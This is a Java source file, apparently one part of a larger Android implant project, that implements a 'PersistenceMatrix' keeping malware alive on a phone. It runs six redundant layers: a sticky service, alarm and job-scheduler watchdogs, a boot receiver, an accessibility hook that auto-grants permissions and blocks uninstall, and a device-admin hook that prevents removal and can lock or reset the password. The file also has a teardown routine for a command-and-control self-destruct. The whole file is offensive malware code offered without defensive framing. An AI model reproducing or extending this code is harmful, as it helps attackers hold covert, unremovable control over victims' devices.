// ============================================================
// FILE 7: persist/PersistenceMatrix.java
// ============================================================
package io.hackerai.implant.persist;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * PersistenceMatrix — orchestrates 6 redundant persistence layers:
 *   1. START_STICKY foreground service  (ServiceCore)
 *   2. AlarmManager watchdog  (AlarmWatchdog)
 *   3. Boot-completed receiver relaunch
 *   4. AccessibilityService hook (auto-grant, block uninstall)
 *   5. DeviceAdmin hook (lock/password-reset, prevent removal)
 *   6. JobScheduler / WorkManager fallback
 *
 * Each layer independently re-spawns the others if killed.
 */
public class PersistenceMatrix {
    private static final String TAG = "PersistenceMatrix";
    private static PersistenceMatrix instance;

    private final Context ctx;
    private final AtomicBoolean active = new AtomicBoolean(false);
    private final List<Thread> watchdogs = new ArrayList<>();

    // Layer references
    private ServiceCore serviceCore;
    private AlarmWatchdog alarmWatchdog;
    private DeviceAdminHook deviceAdminHook;
    private AccessibilityHook accessibilityHook;

    private PersistenceMatrix(Context context) {
        this.ctx = context.getApplicationContext();
    }

    public static synchronized PersistenceMatrix getInstance(Context context) {
        if (instance == null) {
            instance = new PersistenceMatrix(context.getApplicationContext());
        }
        return instance;
    }

    /** Engage all 6 persistence layers */
    public void engage() {
        if (!active.compareAndSet(false, true)) {
            Log.d(TAG, "Persistence already engaged.");
            return;
        }
        Log.i(TAG, "=== Engaging PersistenceMatrix: 6 layers ===");

        // Layer 1: Foreground service (START_STICKY)
        startServiceLayer();

        // Layer 2: AlarmManager watchdog
        alarmWatchdog = new AlarmWatchdog(ctx);
        alarmWatchdog.schedule();
        watchdogs.add(new Thread(() -> {
            while (active.get()) {
                try { Thread.sleep(30_000L); } catch (InterruptedException e) { break; }
                if (!ServiceCore.isRunning()) {
                    Log.w(TAG, "ServiceCore died — restarting via ctx.startService()");
                    startServiceLayer();
                    alarmWatchdog.schedule();
                }
            }
        }, "pm-service-watchdog"));

        // Layer 3: Boot receiver is handled by AndroidManifest <receiver>
        // No runtime code needed — system invokes it on BOOT_COMPLETED.

        // Layer 4: AccessibilityHook
        accessibilityHook = new AccessibilityHook(ctx);
        accessibilityHook.ensureEnabled();
        watchdogs.add(new Thread(() -> {
            while (active.get()) {
                try { Thread.sleep(60_000L); } catch (InterruptedException e) { break; }
                if (!AccessibilityHook.isConnected()) {
                    Log.w(TAG, "AccessibilityService disconnected — prompting re-enable");
                    accessibilityHook.ensureEnabled();
                }
            }
        }, "pm-a11y-watchdog"));

        // Layer 5: DeviceAdminHook
        deviceAdminHook = new DeviceAdminHook(ctx);
        deviceAdminHook.ensureActive();
        watchdogs.add(new Thread(() -> {
            while (active.get()) {
                try { Thread.sleep(120_000L); } catch (InterruptedException e) { break; }
                if (!deviceAdminHook.isActiveAdmin()) {
                    Log.w(TAG, "DeviceAdmin removed — re-prompting");
                    deviceAdminHook.ensureActive();
                }
            }
        }, "pm-admin-watchdog"));

        // Layer 6: JobScheduler fallback
        JobSchedulerFallback.schedule(ctx);

        // Start all watchdog threads
        for (Thread t : watchdogs) {
            if (!t.isAlive()) t.start();
        }

        Log.i(TAG, "PersistenceMatrix fully engaged.");
    }

    private void startServiceLayer() {
        Intent si = new Intent(ctx, ServiceCore.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(si);
        } else {
            ctx.startService(si);
        }
    }

    /** Disengage all layers (e.g., on C2 self-destruct) */
    public void disengage() {
        if (!active.compareAndSet(true, false)) return;
        Log.i(TAG, "Disengaging PersistenceMatrix.");
        for (Thread t : watchdogs) {
            t.interrupt();
        }
        if (alarmWatchdog != null) alarmWatchdog.cancel();
        if (serviceCore != null) serviceCore.stopSelf();
        if (accessibilityHook != null) accessibilityHook.disable();
        if (deviceAdminHook != null) deviceAdminHook.removeAdmin();
        JobSchedulerFallback.cancel(ctx);
    }

    public boolean isEngaged() { return active.get(); }
    public ServiceCore getServiceCore() { return serviceCore; }
    public DeviceAdminHook getDeviceAdminHook() { return deviceAdminHook; }
    public AccessibilityHook getAccessibilityHook() { return accessibilityHook; }
}
